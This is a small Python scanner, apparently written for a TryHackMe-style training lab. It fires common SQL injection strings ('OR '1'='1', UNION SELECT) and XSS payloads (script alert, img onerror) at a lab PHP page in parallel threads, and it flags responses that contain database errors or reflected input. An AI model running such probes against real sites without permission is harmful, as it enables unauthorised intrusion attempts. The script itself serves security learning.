import requests
import threading

url = 'http://python.thm/labs/lab2/departments.php?name='

payloads = {
    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

print('start scanning:')

def scan(vuln,payload):
    response = requests.get(url,params={"name":payload})
    response_lower = response.text.lower()
    if vuln == "SQLi" and any(error.lower() in response_lower for error in sqli_errors):
        print('SQLI возможна:',payload)
    
    if vuln == "XSS" and payload.lower() in response_lower:
        print('XSS возможна:',payload)
    


threads = []

for vuln, tests in payloads.items():
    for payload in tests:
        t=threading.Thread(target=scan,args=(vuln,payload))
        threads.append(t)
        t.start()

for t in threads:
    t.join()